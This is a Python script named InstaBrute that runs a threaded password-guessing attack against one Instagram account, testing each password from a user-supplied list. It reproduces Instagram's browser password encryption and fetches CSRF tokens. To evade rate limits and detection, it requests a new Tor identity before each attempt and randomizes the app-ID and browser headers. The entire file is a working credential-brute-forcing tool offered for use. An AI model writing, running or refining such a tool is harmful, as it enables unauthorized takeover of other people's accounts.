
from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input
from fake_useragent import UserAgent
from stem import Signal
from stem.control import Controller

import base64
import struct
import datetime
import binascii
import json
import socks
import socket
import json
from urllib.parse import quote_plus

# pip install pycryptodomex
from Cryptodome import Random
from Cryptodome.Cipher import AES

# pip install PyNaCl
from nacl.public import PublicKey, SealedBox

CheckVersion = str(sys.version)
import re
from datetime import datetime

 
class InstaBrute(object):
    def __init__(self):
        # Configure Tor proxy
        self.proxies = {
            'http': 'socks5://127.0.0.1:9050',
            'https': 'socks5://127.0.0.1:9050'
        }
        self.UserAgent = UserAgent().random
        try:
            user = input('username : ')
            Combo = input('passList : ')
            print('\n----------------------------')

        except:
            print(' The tool was arrested exit ')
            sys.exit()

        with open(Combo, 'r') as x:
            Combolist = x.read().splitlines()
        thread = []
        self.Coutprox = 0
        for combo in Combolist:
            password = combo.split(':')[0]
            t = threading.Thread(target=self.New_Br, args=(user, password, self.proxies, self.UserAgent))
            t.start()
            thread.append(t)
            time.sleep(2)
        for j in thread:
            j.join()

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])
    
    def encrypt_password(self, key_id, pub_key, password, version=10):
            key = Random.get_random_bytes(32)
            iv = bytes([0] * 12)

            time = int(datetime.now().timestamp())
            aes = AES.new(key, AES.MODE_GCM, nonce=iv, mac_len=16)
            aes.update(str(time).encode('utf-8'))
            encrypted_password, cipher_tag = aes.encrypt_and_digest(password.encode('utf-8'))

            pub_key_bytes = binascii.unhexlify(pub_key)
            seal_box = SealedBox(PublicKey(pub_key_bytes))
            encrypted_key = seal_box.encrypt(key)

            encrypted = bytes([1,
                            key_id,
                            *list(struct.pack('<h', len(encrypted_key))),
                            *list(encrypted_key),
                            *list(cipher_tag),
                            *list(encrypted_password)])
            encrypted = base64.b64encode(encrypted).decode('utf-8')

            return quote_plus(f'#PWD_INSTAGRAM_BROWSER:{version}:{time}:{encrypted}')



    def New_Br(self, user, pwd, proxies, UserAgent):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        X_Ig_App_Id = randint(100000000000000, 999999999999999)
        X_Instagram_Ajax = randint(1000000000, 9999999999)
        Viewport_Width = randint(1000, 9999)
        X_Asbd_Id = randint(100000, 999999)
        chrom_version = str(randint(100, 999))+".0."+str(randint(1000, 9999))+"."+str(randint(10, 999))
        #time = int(datetime.now().timestamp())
        headers = { 'User-Agent': UserAgent }
        with Controller.from_port(port = 9051) as c:        
          c.authenticate()
          c.signal(Signal.NEWNYM)
          try:
            data = json.loads(requests.get('https://www.instagram.com/data/shared_data/', proxies=proxies, headers=headers).text)
            publicKey = data['encryption']['public_key']
            keyId     = data['encryption']['key_id']
            version = data['encryption']['version']
            country_code = data['country_code']
            csrf = data['config']['csrf_token']
            result = self.encrypt_password(int(keyId), publicKey, pwd, int(version))
            payload = "enc_password="+result+"&optIntoOneTap=false&queryParams=%7B%7D&trustedDeviceRecords=%7B%7D&username="+user
            r = requests.post(login_url, data=payload, proxies=proxies, headers={
                "Host": "www.instagram.com",
                "Content-Length": str(len(payload)),
                "Sec-Ch-Ua": "'Not:A-Brand';v='99', 'Chromium';v='112'",
                "X-Ig-Www-Claim": "0",
                "Sec-Ch-Ua-Platform-Version": "15.0.0",
                "X-Requested-With": "XMLHttpRequest",
                "Sec-Ch-Ua-Full-Version-List": "'Not:A-Brand';v='99.0.0.0'",
                "X-Csrftoken": csrf,
                "Sec-Ch-Prefers-Color-Scheme": "light",
                "Sec-Ch-Ua-Platform": "",
                "X-Ig-App-Id": str(X_Ig_App_Id),
                "Sec-Ch-Ua-Mobile": "?0",
                "X-Instagram-Ajax": str(X_Instagram_Ajax),
                "User-Agent": UserAgent,
                "Viewport-Width": str(Viewport_Width),
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "*/*",
                "X-Asbd-Id": str(X_Asbd_Id),
                "Origin": "https://www.instagram.com",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://www.instagram.com/",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"
            })
            print(f'{user}:{pwd}:{country_code}\n----------------------------')
            print(f'{r.text}')
            response_data = json.loads(r.text)
            if "authenticated" in r.text:
                pass
                #print(response_data["authenticated"])
            elif  response_data["message"] == True: 
                print(f'le mot de passe : {pwd} est {response_data["message"]}')
          except:
            pass


InstaBrute()